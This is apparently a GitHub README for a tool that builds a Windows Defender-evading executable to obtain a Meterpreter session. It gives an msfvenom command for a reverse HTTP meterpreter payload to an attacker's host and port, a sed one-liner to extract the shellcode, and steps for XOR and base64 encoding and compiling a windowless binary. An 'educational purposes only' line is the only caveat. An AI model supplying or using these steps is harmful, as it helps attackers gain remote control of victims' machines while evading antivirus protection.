## Bypassing-WindowsDefender

The aim of the project is to demonstrate that it is still possible to bypass Windows Defender to obtain a meterpreter. This project is for educational purposes only and should not be used for illegal or malicious activities.

### External library used in this project

- https://github.com/ReneNyffenegger/cpp-base64

### Creating stageless payload

```bash
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f c -o main.c
```

### Copying our shellcode to the clipboard

```bash
sed -E 's/"\\/0/g;s/"$/,/g;s/\\x/, 0x/g;s/";//g;/unsigned char [A-Za-z]+\[\] =/d' main.c | xclip -sel clip
```

- Create a file called `payload.txt` in the same folder where the `tool.py` script is located and paste your shellcode there.

### Running tool.py

```powershell
python3 tool.py
```

- Copy the subtraction value and add it to main.cpp in `int subtract = [HERE];`. (This is just to avoid using the xor key directly in the code, you can remove it if you want)

- Remember that you can change the value of the `xor_value` variable in the `tool.py` code.
- The tool will create a file called `payload.b64`, which will contain your encrypted and base64-encoded shellcode that you must replace in the main.cpp.

### Compilation command

```powershell
g++.exe -m64 -o app.exe -lkernel32 -static main.cpp base64.cpp -mwindows -I . -D_WIN32_WINNT=0x0601
```

Make sure you have `base64.h` and `base64.cpp` in your project.

### Demo video

https://user-images.githubusercontent.com/89106058/237018521-ff5d43e9-b833-421f-9a83-e47385bf5a0c.mp4


